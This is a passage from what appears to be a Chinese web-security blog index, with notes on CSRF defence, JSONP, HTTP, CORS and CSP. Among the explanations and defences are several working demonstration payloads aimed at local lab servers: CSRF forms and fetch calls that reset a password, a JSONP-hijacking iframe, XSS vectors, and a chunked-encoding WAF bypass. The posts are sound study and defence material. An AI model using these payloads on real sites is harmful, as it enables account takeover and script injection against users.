submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open("POST", "http://127.0.0.1:8888/json", true); xhr.setRequestHeader("Accept", "*/*"); xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"); xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8"); xhr.withCredentials = true; xhr.send(JSON.stringify(&#123;"action":"change passwd..."&#125;)); xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123; alert(xhr.responseText); &#125; &#125; &#125; &lt;/script&gt; &lt;button onclick="submitRequest()"&gt;Conform&lt;/button&gt; """ return render_template_string(template) else: if session.get('user','')=='admin': data=json.loads(request.get_data(as_text=True)) ret='Admin do '+data["action"] else: ret="No Privilege2..." return ret 攻击方法 使用表单伪造post，关键是用name字段构造一个合法的json： 1234&lt;form action="http://127.0.0.1:8888/json" method="POST" enctype="text/plain"&gt;&lt;input name='&#123;"action":"change passwd...", "test":"' value='test"&#125;' type='hidden'&gt;&lt;input type=submit&gt;&lt;/form&gt; 使用js伪造post json 1fetch('http://127.0.0.1:8888/json',&#123;method: 'POST', credentials: 'include', headers:&#123;'Content-Type': 'text/plain'&#125;, body:'&#123;"action":"reset password"&#125;'&#125;) 防御主要有两种手段： 根据Referer判断，但是要考虑没有referer字段的情况 增加一个随机的Token，前端发送后，后端比较是否一致，本文主要介绍这一种方法 GET型在产生GET请求的地方就加一个csrf_token，在处理get请求时判断csrf_token与cookie或session中的token是否一致。 POST表单型对于flask，使用 1234from flask_wtf.csrf import CSRFProtectapp.config['SECRET_KEY'] = 'you never guess'CSRFProtect(app) 打开csrf保护，接着再对所有的表单添加一个隐藏字段即可： 1&lt;input type="hidden" name="csrf_token" value="&#123;&#123; csrf_token() &#125;&#125;" /&gt; 增加隐藏字段后，每次POST时都会带有一个csrf_token，攻击者由于同源策略是无法获取这个token的，另外token写进session里面，即session和token是一对一关系，因此攻击者也无法通过自己的token猜测别人的token，而服务器再POST请求过来时就会验证这个token是否与session一致，若不一致则拒绝服务，这样一来攻击者就无法攻击成功了（除了把token放表单里，还可以放cookie里，攻击者仍然无法获取） POSTJSON型理论上严格控制content-type: application/json就能解决问题，当然也可以用通用方法： 同样还是先开启CSRF防御： 123456from flask_wtf.csrf import CSRFProtectapp = Flask(__name__)app.secret_key = 'random_secret_key'CSRFProtect(app) 让自己站的ajax拿到csrf_token，就像之前说的，将token放进cookie里，使用app.after_request修饰使得每个页面返回时都执行： 1234567@app.after_requestdef after_request(response): # 调用函数生成 csrf_token csrf_token = generate_csrf() # 通过 cookie 将值传给前端 response.set_cookie("csrf_token", csrf_token) return response 接着ajax从cookie拿到token并放到headers里，不用担心攻击者，因为由于同源策略，他们没法获取其他网站的cookie： 12345678910111213141516171819202122232425262728293031323334353637@app.route('/json2', methods=['GET'])def json2(): template = """ &lt;html&gt; &lt;title&gt;Normal&lt;/title&gt; &lt;center&gt; &lt;h1&gt; Reset Password &lt;/h1&gt; &lt;head&gt; &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function()&#123; $("button").click(function()&#123; // body为"data=json"的请求 // var data = &#123;data: JSON.stringify(&#123;"action": "reset password"&#125;)&#125; // body直接为json var data = JSON.stringify(&#123;"action": "reset password"&#125;) $.ajax(&#123; url:"http://127.0.0.1:8888/json", contentType: "application/json", headers:&#123;'X-CSRFToken':$.cookie('csrf_token')&#125;, dataType: "json", type: 'POST', data: data, success: function (msg) &#123; alert(msg.status); &#125; &#125;) &#125;); &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;Conform&lt;/button&gt; &lt;/body&gt; &lt;/html&gt; """ return render_template_string(template) 参考链接 CSRF-Scanner——打造全自动检测CSRF漏洞利器，https://security.tencent.com/index.php/blog/msg/24]]></content>
      <categories>
        <category>Web安全-CSRF</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CSRF</tag>
        <tag>防御</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSONP原理及其安全性问题]]></title>
    <url>%2Fjsonp-JSONP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[JSONP原理JSONP（JSON with Padding）是一种跨域获取数据的方法，因为带src属性的标签如&lt;script&gt;允许跨域（1. 在CSP没有设置的情况下, 2.跨域时是可以带cookie的），因此前端可以设置一个callback请求并生成一个访问后台某个&lt;script&gt;的链接，后台在链接中动态的将数据包裹在先前的callback函数中，作为参数返回给前台，这样就完成了跨域获取数据的效果。 简单示例后台12345678910111213141516171819202122import jsonfrom flask import Flask, request, render_template_stringapp = Flask(__name__)app.secret_key='random_secret_key'@app.route('/remote.js', methods=['GET'])def remote(): _id=int(request.args.get("id")) # fetch data from database... user=[ dict(username="zhangsan",stat="student"), dict(username="lisi",stat="working"), dict(username="wangwu",stat="student"), ] callback=request.args.get("callback") json_data=json.dumps(user[_id]) template="&#123;&#123;callback&#125;&#125;(&#123;&#123;json_data&#125;&#125;)" return render_template_string(template, callback=callback, json_data=json_data)if __name__ == '__main__': app.run(host='127.0.0.1', port=8888, debug=True) 这样，加入我们访问http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，那么会得到如下结果： 前台那么前端就可以嵌入一个&lt;script&gt;标签，其中src设置为http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，以此获取数据： 1234567891011121314&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;script type="text/javascript"&gt; // 得到查询结果后的回调函数 var mycallback = function(data)&#123; alert('username: ' + data.username + ', status: '+ data.stat); &#125;; &lt;/script&gt; &lt;!-- 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码） --&gt; &lt;script src="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt; 可以看到获取数据成功： 同时给出jQuery的版本： 12345678910111213141516$(document).ready(function()&#123; $.ajax(&#123; type: "get", async: false, url: "http://127.0.0.1:8888/remote.js?id=1", dataType: "jsonp", jsonp: "callback",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback) jsonpCallback:"mycallback",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据 success: function(json)&#123; alert('username: ' + data.username + ', status: '+ data.stat); &#125;, error: function()&#123; alert('fail'); &#125; &#125;);&#125;); JSONP的安全性问题JSON劫持导致CSRF主要表现为后台没有做身份认证，导致任何前台都可以发送JSONP请求，若请求中存在敏感信息则会发生信息泄露（相当于CSRF）。 防御方法 使用referer过滤，对于空referer不予以放行 增加一个随机token 可以看到整体的防御方法类似于CSRF的防御方法。 空referer进行基于referer的防御时，对于空referer的情况应不予以放行，因为攻击者可以使用某些标签（iframe）构造空referer。Payload如下： 1&lt;iframe src="javascript:'&lt;script&gt;function callback(o)&#123;alert(o.username);&#125;&lt;/script&gt;&lt;script src=http://127.0.0.1:8888/remote.js?id=1&amp;callback=callback&gt;&lt;/script&gt;'"&gt;&lt;/iframe&gt; 自定义Callback导致XSS比如说本文的实例，攻击者可以构造如下链接导致反射型XSS： 1http://127.0.0.1:8888/remote.js?id=1&amp;callback=&lt;script&gt;alert(/xss/)&lt;/script&gt; 防御方法 定义Content-Type: application/json 对XSS字符进行能过滤]]></content>
      <categories>
        <category>Web安全-JSONP</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>同源</tag>
        <tag>JSONP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议复习]]></title>
    <url>%2FHTTP-HTTP%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[HTTP 请求 GET 用于获取数据，无请求body POST 用于添加数据 其content-type不同，body中的格式也不同 PUT 用于添加或更新数据 Request: 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; Response: 若资源不存在需要创建，那么服务器需响应201表明内容已创建： 12HTTP/1.1 201 CreatedContent-Location: /new.html 若资源存在则返回200或204: 12HTTP/1.1 204 No ContentContent-Location: /existing.html PATCH 用于更新数据 Request: 1234567PATCH /file.html HTTP/1.1 Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100&#123;"op":"move", "from":"/a/b/c", "to":"/a/b/d"&#125; Response: 正确回应应该为204因为200会带返回body 123HTTP/1.1 204 No ContentContent-Location: /file.txtETag: "e0023aa4f" DELETE 用于删除数据 Request： 1DELETE /file.html HTTP/1.1 Response: 202已经接受但操作未执行完，204或者200(需返回body) 12345678HTTP/1.1 200 OK Date: Wed, 21 Oct 2015 07:28:00 GMT&lt;html&gt; &lt;body&gt; &lt;h1&gt;File deleted.&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; HEAD 用于获取GET请求的响应头，无请求body OPTIONS 用于描述通信选项，如CORS使用或者获取服务器所支持的方法 TRACE 回显服务器收到的请求 19/08/28更新：经过大佬纠正，RFC72303.3节明确指出任何请求都可以带body，而developer.mozilla那边写错了。 对比幂等性：不论进行多少次操作，都返回相同的结果。 安全性（Safe）：方法不改变资源，可以理解为只读性。 GET POST PUT PATCH DELETE HEAD OPTIONS TRACE 请求含body N Y Y Y May N N N 回应含body Y Y N Y May N Y N 安全性 Y N N N N Y Y N 幂等性 Y N Y May Y Y Y N 可缓存 Y Y N N N Y N N 可以被表单使用 Y Y N N N N N N POST、PUT和PATCH的区别用法区别： POST用于创建资源 PUT用于创建或更新资源 PATCH用于更新资源（与PUT不同的是PATCH的body部分必须包含对象需要更新的属性新的值并且可能包含旧的值，而PUT需要包含对象的所有必须(包括新的和旧的)属性）注意这决定了PATCH不能保证幂等性，下文会详细讨论。 幂等性区别： POST是不幂等的，例如POST /api/create/user/a为创建一个用户a，再次POST则对再次创建（即使先前存在一个重复数据）。 PUT是幂等的，即存在则更新，不存在则创建。 PATCH的设计有可能幂等——body部分只包含更新后的值，比如（{&quot;name&quot;:&quot;newname&quot;})，也有可能是不幂等的——body部分包含了更新前的值和更新后的值，比如（{&quot;op&quot;:&quot;rename&quot;,&quot;oldname&quot;:&quot;Old&quot;，”newname&quot;,&quot;New&quot;}）第二次执行时，因为oldname已经不为”Old“，所以会抛出异常。 当然这只是规范的设计，在实际应用中，由于开发者素质和业务场景的不同，很可能打破这些请求的原有功能，比如很多情况下用POST代替了PUT和PATCH。 响应码只列举常用的 信息响应101 switching Protocol 服务器将用Upgrade通知客户端采用不同协议完成这个请求 成功200 OK 请求成功 重定向301 Moved Permanently 永久重定向 302 Found 请求的资源现在临时从不同的 URI 响应请求。 客户端问题400 Bad Request 语意有错误或请求参数有误 401 Unauthorized 当前请求需要用户验证 403 Forbidden 服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。 404 Not Found 请求失败，请求所希望得到的资源未被在服务器上发现。 408 Request Timeout 请求超时 服务器错误500 Internal Server Error 服务器遇到了不知道如何处理的情况 502 Bad Gateway 上游服务器（如tomcat、php-fpm）的响应是无效的 503 Service Unavailable 服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机 504 Gateway Timeout 当服务器作为网关，不能及时得到响应时返回此错误代码。 HTTP 首部HTTP的首部说不完，只列举与安全有关的，值得注意的是x-开头的头部为自定义头部，这在2012年6月已经被RFC废止。 Host用于不同域名配置在同一个IP地址的服务器上，web容器（如nginx）通过该字段转发请求。 Content-Length对于持续连接来说，使用Content-Lenght来定义http报文边界。 Transfer-Encoding: chunked分块传输，将报文分块发送，这样发送方不需要一次性计算http长度。 每个分块包含一个十六进制数据表示数据长度和数据部分，用CLRF(\r\n)结尾；最后一个分块长度为0表示结束；;表示注释，可以用来绕过WAF 12345678910111213141516171819HTTP/1.1 200 OKContent-Type: text/plainTransfer-Encoding: chunked25\r\nThis is the data in the first chunk\r\n1C\r\nand this is the second one\r\n3;xxxx\r\ncon\r\n8\r\nsequence\r\n0\r\n\r\n(两个换行) X-Frame-Options用于防御UI点击劫持，它是指攻击者改造网页，在网页前加入一个透明的iframe框诱惑攻击者点击，格式为： 1X-Frame-Options: DENY | SAMEORIGIN | ALLOW-FROM URL 目前已经被CSP取代： 1Content-Security-Policy: frame-ancestors &apos;none&apos;; 或 1Content-Security-Policy: frame-ancestors &apos;self&apos;; X-XSS-Protection用于防御反射型XSS，默认配置为： 1X-XSS-Protection: 1 表示开启XSS防御，0表示关闭。 HSTSHSTS指示浏览器强制使用HTTPS，它的头部为Strict-Transport-Security 1Strict-Transport-Security: &lt;max-age=31536000&gt;[; includeSubDomains][; preload] max-age指HSTS的过期时间，通常是一年 includeSubDomains指当前域名和子域名均开启HSTS preload指申请将该域名加入浏览器内置列表中，以后的所有访问都将使用https链接（可以在https://hstspreload.org/上看） 详细解释一下，若不加HSTS，那么用户的访问是这样的： 因此攻击者可以展开中间人攻击： 使用HSTS防御后用户可以防御该攻击： HPKP为了防止CA悄悄修改证书内容，服务器可以将自己公钥填在HTTP头中，让浏览器核对其与证书是否一致：1Public-Key-Pins: pin-sha256=&quot;base64==&quot;; max-age=expireTime [; includeSubdomains][; report-uri=&quot;reportURI&quot;] Referrer-PolicyReferer: A.com 指跳转来自A.com默认情况下，只要发生跳转，浏览器就会自动添加referer头，服务器可以用referer-prolicy指定为其他： 值 介绍 空 Policy未设置 no-referrer 任何情况下都不发送referer no-referrer-when-downgrade https至http时不发送referer origin 仅发送protocal://host部分 origin-when-cross-origin 跨域时发送origin same-origin 同源时发送 strict-origin 双方origin相同且安全等级相同 unfafe-url 任何情况下都发送完整referer 关于请求IP Client-IP： 1Client-IP: 127.0.0.1 X-Forwarded-For： 1X-Forwarded-For: client1, proxy1, proxy2, proxy3 X-Originating-IP: 1X-Originating-IP: 127.0.0.1 X-Remote-Addr: 1X-Remote-Addr: 127.0.0.1 可以看到这四个请求包头都是可以伪造的，所以还是通过源IP来直接获取主机IP为好，这里给出PHP的实现 1$_SERVER['REMOTE_ADDR'] == '127.0.0.1' Cookies服务器使用Set-Cookie设置Cookie1Set-Cookie: id=a3fWa; [Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly] Expires：指Cookie的过期时间 Domain=mozilla.org：Cookie作用于mozilla.org及其子域名 Secure：Cookie只能通过HTTPS发送给服务端 HttpOnly：Cookie不能被js调用 注意Cookie的属性即是指键值对，过期时间和作用域。 CSP与CSP有关的header请参考内容安全策略CSP学习笔记一文。 CORS与CORS有关的头部有origin,access-control-等，详细我会另开一篇文章。 HTML5http协议的body部分格式主要为HTML，而新引入的HTML5中同时引入了很多安全性问题： CORS的安全性问题详见另一篇文章 新标签带来新的XSS机会 video 1&lt;video&gt; &lt;source onerror="javascript:alert(1)"&gt; 类似的标签还有audio、input、select、textarea、keygen等。 新属性 onfocus 1&lt;input onfocus=alert(1) autofocus&gt; formaction 1&lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt; onscroll 123&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; 更多可查看：HTML5 标签安全 Web Workerjs的多线程支持为新的僵尸网络或挖矿脚本 提供机会： 1var worker = new Worker("worker.js"); PostMessagepostmessage可能会导致新的XSS攻击： 12345var worker = new Worker("worker.js");worker.postMessage("hello world");worker.onmessage = function(e) &#123; document.getElementById("test").innerHTML = e.data;&#125; 参考链接 HTTP, https://developer.mozilla.org/zh-CN/docs/Web/HTTP Whitepaper: HTTP Security Headers and How They Work, https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader HSTS详解，https://www.jianshu.com/p/caa80c7ad45c HTML5 安全问题解析, https://segmentfault.com/a/1190000003756563]]></content>
      <categories>
        <category>Web安全-HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>协议安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP的访问控制与跨域资源共享（CORS）]]></title>
    <url>%2FHTTP-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[本文首次发表在Freebuf：https://www.freebuf.com/articles/web/195925.html 同源策略准确的说，同源策略是指，浏览器内部在发起如下请求时，该来源必须是当前同源的HTTP资源： 以跨站点的方式调用XMLHttpRequest或者Fetch API。 Web字体（用于CSS中@ font-face的跨域字体使用） WebGL textures 使用drawImage绘制到canvas的图像/视频帧。 样式表（用于CSSOM访问） 注意：两个URI同源当且仅当它们的协议://host:port相同。 从第一点可以看到，浏览器限制从脚本内部发起跨域的HTTP请求——更准确的说，同源策略有的限制有两种表现：（1）限制发起AJAX请求(XMLHttpRequest，Fetch)；（2）拦截其他跨站请求的返回结果；这取决于请求是否为简单请求。 CORS跨域资源共享（Cross-Origin Resource Sharing, CORS）是一种解决跨域请求的方案，其机制是使用一组额外响应头（Access-Control-Allow-Origin）和预检请求(OPTIONS)来使浏览器有权使用非同源资源。大部分的现代浏览器符合该标准。 简单请求若请求满足所有下述条件，则该请求可视为“简单请求”： 使用下列方法之一： GET HEAD POST 并且Content-Type的值仅限于下列三者之一： text/plain multipart/form-data application/x-www-form-urlencoded Fetch 规范定义了对 CORS 安全的首部字段集合，也就是说，不得手动设置除以下集合之外的字段（否则不为简单请求）。该集合为： Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width 并且请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。 并且请求中没有使用 ReadableStream 对象。 简单请求会直接发送请求而不会触发预请求，但是不一定能拿到结果，这取决于请求的服务器Response的Access-Control-Allow-Origin内容。注意以上条件只要有一条不满足则不为简单请求。 简单请求跨域表现发起请求服务http://127.0.0.1:8000/ajax.html： 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;AJAX&lt;/title&gt;&lt;/head&gt;&lt;script&gt;function submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open("GET", "http://127.0.0.1:8888/get", true); xhr.withCredentials = true; xhr.send(); xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123; alert(xhr.responseText); &#125; &#125;&#125;&lt;/script&gt;&lt;button onclick="submitRequest()"&gt;AJAX&lt;/button&gt;&lt;/html&gt; 非同源服务http://127.0.0.1:8888/： 1234567891011121314151617181920212223from flask import Flask, request, render_template_string, sessionapp = Flask(__name__)app.secret_key='random_secret_key'@app.route('/get', methods=['GET'])def get(): if session.get('user','')=='admin': return "Admin do something!" else: return "No Privilege..."@app.route('/login', methods=['GET'])def login(): user=request.args.get("user", "Null") session["user"]=user template=""" &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt; """ return render_template_string(template, user=user)if __name__ == '__main__': app.run(host='127.0.0.1', port=8888, debug=True) 发请求，可以看到请求确实已发送，并且可以带cookie（withCredentials），但是js没有拿到结果： AJAX请求结果（请求成功，回传失败，所以这也是GET型CSRF无法很好防范的原因）： 综上，对于简单跨域请求，若未正确配置则请求正常发送，不能获取返回结果（浏览器拦截）。 Origin和Access-Control-Allow-Origin可以看到在请求中存在Origin字段，它标记了来源，对应的Access-Control-Allow-Origin为回应包头携带字段，它表示那些来源可以访问本域，*表示所有来源（注意它不能与credentials一起使用）。 使用CORS实现的支持跨域的非同源服务http://127.0.0.1:8888/： 1234567891011@app.route('/get', methods=['GET'])def get(): if session.get('user','')=='admin': ret = "Admin do something!" else: ret = "No Privilege..." resp=make_response(ret) resp.headers['Access-Control-Allow-Origin'] = "http://127.0.0.1:8000" resp.headers['Access-Control-Allow-Credentials'] = 'true' resp.headers['Access-Control-Allow-Methods'] = "POST, GET, OPTIONS, PUT, DELETE, PATCH" return resp 其中还有几个header： Access-Control-Allow-Credentials：如果请求需要带cookie，该header必须为true，同时Access-Control-Allow-Origin不能为*，否则同样拿不到结果； Access-Control-Allow-Methods：允许的请求方式 Origin和Access-Control-Allow-Origin一个为请求携带的字段，一个为回应携带的字段，浏览器以此来判断js是否可以接收回应。 改造后前端终于能够拿到结果： 预检请求若请求不为简单请求，那么在发起该请求前必须使用OPTIONS发送预验请求，服务器允许后才能发送实际请求（可以猜想这是为了防止CSRF）。 当请求满足一下任一条件时，该请求为非简单请求： 使用了下面任一 HTTP 方法： PUT DELETE CONNECT OPTIONS TRACE PATCH 人为设置了对 CORS 安全的首部字段集合 之外的其他首部字段。 Content-Type的值不属于下列之一: application/x-www-form-urlencoded multipart/form-data text/plain 请求中的XMLHttpRequestUpload 对象注册了任意多个事件监听器。 请求中使用了ReadableStream对象。 预检请求跨域表现假设有服务器http://127.0.0.1:8888/json： 12345678910111213@app.route('/json', methods=['GET','POST'])def json(): if request.method == 'GET': return render_template('json.html', Evil="Benign") else: if session.get('user','')=='admin': print("session:",session) data=request.json ret='Admin do '+data["action"] else: ret="No Privilege2..." print(ret) return jsonify(&#123;'result': ret&#125;) ‘templates/json.html’内容为： 1234567891011121314151617181920212223242526&lt;html&gt;&lt;title&gt;&#123;&#123; Evil &#125;&#125;&lt;/title&gt;&lt;center&gt;&lt;h1&gt; Reset Password &lt;/h1&gt;&lt;head&gt;&lt;script type="text/javascript"&gt;function submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open("POST", "http://127.0.0.1:8888/json", true); xhr.setRequestHeader("Accept", "*/*"); xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"); xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8"); xhr.withCredentials = true; xhr.send(JSON.stringify(&#123;"action":"change passwd..."&#125;)); xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123; alert(xhr.responseText); &#125; &#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button onclick="submitRequest()"&gt;Conform&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 同域不存在预检请求： 跨域出现OPTIONS请求，默认情况下跨域被阻止： Access-Control-Request-Method:字段说明请求的操作 允许跨域请求在OPTIONS和POST报头加入Access-Control-Allow-Origin等字段1234567891011121314151617@app.route('/json', methods=['GET','POST','OPTIONS'])def json(): if request.method == 'GET': return render_template('json.html', Evil="Benign") else: if session.get('user','')=='admin': print("session:",session) data=request.json ret='Admin do '+data["action"] else: ret="No Privilege2..." resp=make_response(jsonify(&#123;'result': ret&#125;)) resp.headers['Access-Control-Allow-Origin'] = "http://127.0.0.1:8000" resp.headers['Access-Control-Allow-Credentials'] = 'true' resp.headers['Access-Control-Allow-Methods'] = "POST, GET, OPTIONS, PUT, DELETE, PATCH" resp.headers['Access-Control-Allow-Headers'] = "origin, content-type, accept, x-requested-with" return resp 跨站成功，先发送OPTIONS，再发送POST，注意这两个报头必须都存在CORS字段。 与CORS有关的HTTP头请求 Origin：&lt;origin&gt;：表示实际请求的源站 Access-Control-Request-Method: &lt;method&gt;：用于预检请求，表示真实的请求方法。 Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*：用于预检请求，表示真实请求所携带的首部字段（从抓包上来看chrome没有按要求来啊Orz） 响应 Access-Control-Allow-Origin: &lt;origin&gt; | *：允许外域URI Access-Control-Allow-Credentials：false：是否允许浏览器读取response内容（如cookie） Access-Control-Allow-Methods：用于预检请求响应，表示允许使用的HTTP方法 Access-Control-Allow-Headers：用于预检请求响应，表示允许携带的头部 Access-Control-Expose-Headers：允许响应时能获取的其他头部（在跨域访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头） Access-Control-Max-Age：preflight请求的最大响应时间 参考链接 Cross-Origin Resource Sharing（CORS）详解，CORS详解，CORS原理分析，https://www.cnblogs.com/demingblog/p/8393511.html HTTP访问控制（CORS），https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS]]></content>
      <categories>
        <category>web安全-HTTP</category>
      </categories>
      <tags>
        <tag>CORS</tag>
        <tag>跨域，HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内容安全策略CSP学习笔记]]></title>
    <url>%2FHTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[简介内容安全策略 (CSP) 是一个额外的安全层，用于允许站点的管理者控制页面上哪些资源能够被用户代理程序加载。以阻止包括跨站脚本 (XSS) 、数据注入等攻击。 使用在HTTP头部指定策略1Content-Security-Policy: policy 使用meta标签指定策略1&lt;meta http-equiv="content-security-policy" content="policy"&gt; 示例存在漏洞的服务器写一个反射式的XSS服务吧： 12&lt;?php echo $_GET[&apos;xss&apos;];?&gt;&lt;script src=&quot;/js/benign.js&quot;&gt;&lt;/script&gt; bengin.js: 1alert("I'm benign~~~"); evil.js: 1alert("I'm evil!"); 毫无疑问它是存在漏洞的，不过无奈现在chrome的反射型xss防御做的太好了，我们只能先暂时关闭它(j加header)来降低实验难度，在BP里面加一个”X-XSS-Protection:0”的Header： 我在8000端口又起了一个http服务，接着随心所欲的XSS： 应用默认策略配置该站点的内容均来自同源： 1Content-Security-Policy: default-src 'self' 其中，default-src是指若其他元素来源的规则（如script-src，img-src）没有设置的情况下，默认使用default-src的配置，self是同源。 设置后可以看到xss被拦截，以为恶意脚本来自不同的源： 信任多个域名元素的可信来源可以有多个，比如： 1Content-Security-Policy: default-src 'self' *.trusted.com 来源配置 *： 允许所有 none：禁止加载任何路径的资源 self：允许加载同源的资源 data:：允许通过数据模式加载资源 domain.ccc.com：允许加载匹配域名的资源 *.ccc.com：允许加载匹配域名的资源 https://img.ccc.com：允许加载https方式的域名资源 unsafe-inline：允许使用内联元素 unsafe-eval：允许执行eval函数 精确控制其他可以设置的源有： child-src connect-src font-src frame-src img-src manifest-src media-src object-src script-src style-src worker-src sandbox allow-forms allow-scripts：授权一个沙箱来请求iframe sanbox等类似属性的资源，沙箱默认使用同源策略，可增加配置，如allow-scripts，允许跨站script 例如，信任任意的图片来源，但是只信任本站的其他来源： 1Content-Security-Policy: default-src 'self'; img-src * 内嵌脚本新版的默认策略已经封禁了内嵌脚本的执行，这意味着即使我们不引入外部js，而直接在&lt;script&gt;标签里面写东西也是不允许的（这也造成巧妙地绕过CSP：欺骗CSP执行任意代码一文的失效： 那么正常的需求怎么办呢？正常服务器发送网页的时候，需要在策略中告诉浏览器一个随机生成的token。 1Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa' 页面内嵌脚本必须有这个token才能执行：1&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt; // some code &lt;/script&gt; 测试策略可以将CSP配置为仅报告模式，这样即使出现违规，CSP也只是报告这个行为而不强制拦截： 1Content-Security-Policy-Report-Only: default-src 'self'; report-uri http://127.0.0.1:8000 http://127.0.0.1:8000收到的报告如下： 其他关键字兼容性毫无疑问很多浏览器是不支持这个字段的，详细的支持参见https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP 参考链接 内容安全策略( CSP )，https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP 巧妙地绕过CSP：欺骗CSP执行任意代码，https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa]]></content>
      <categories>
        <category>Web安全-HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>CSP</tag>
        <tag>协议安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019fireshell一道从XXE到SSRF题]]></title>
